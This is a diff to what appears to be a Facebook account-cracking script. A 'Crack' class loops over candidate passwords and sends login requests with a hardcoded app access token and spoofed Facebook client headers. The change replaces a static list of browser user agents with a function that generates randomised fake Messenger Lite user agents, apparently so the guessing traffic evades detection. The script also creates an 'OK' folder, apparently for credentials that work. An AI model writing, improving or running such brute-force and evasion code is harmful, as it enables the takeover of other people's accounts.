@@ -397,7 +397,6 @@ class Crack:
 		try:
 			for pw in pwx:
 				pw = pw.lower()
-				ugent = "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36","Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/44.0.2403.155 Safari/537.36","Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36","Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36","Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36","Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.36","Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36","Mozilla/5.0 (Windows NT 4.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36","Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36","Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36","Mozilla/5.0 (Linux; Android 5.1.1; SM-J320G Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36 UCBrowser/11.5.2.1188 (UCMini) Mobile","Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36[FBAN/EMA;FBLC/id_ID;FBAV/227.0.0.5.115;]"
 				params = {
 					"access_token": "200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16",
 					"sdk_version": {random.randint(1,26)}, 
@@ -414,7 +413,7 @@ class Crack:
 					"x-fb-sim-hni": str(random.randint(20000, 40000)),
 					"x-fb-net-hni": str(random.randint(20000, 40000)),
 					"x-fb-connection-quality": "EXCELLENT",
-					"user-agent": ugent,
+					"user-agent": Session().generate_ugent(),
 					"content-type": "application/x-www-form-urlencoded",
 					"x-fb-http-engine": "Liger"
 				}
@@ -560,11 +559,12 @@ class Lain:
 class Session:
 	
 	###----------[ GENERATE USER AGENT CRACK ]---------- ###
-	#def generate_ugent(self):
-		#versi_android = random.randint(4,12)
-		#versi_chrome = str(random.randint(300,325))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150))
-		#versi_app = random.randint(410000000,499999999)
-	#	return ugent
+	def generate_ugent(self):
+		versi_android = random.randint(4,12)
+		versi_chrome = str(random.randint(300,325))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150))
+		versi_app = random.randint(410000000,499999999)
+		ugent = f"Dalvik/2.1.0 (Linux; U; Android {versi_android}; 21061119DG Build/RP1A.200720.011) [FBAN/MessengerLite;FBAV/{versi_chrome};FBPN/com.facebook.mlite;FBLC/in_ID;FBBV/{versi_app};FBCR/3;FBMF/xiaomi;FBBD/xiaomi;FBDV/21061119DG;FBSV/{str(random.randint(4,10))};FBCA/arm64-v8a:null;FBDM/"+"{density=2.0,width=720,height=1412};]"
+		return ugent
 		
 if __name__=="__main__":
 	try:os.mkdir("OK")
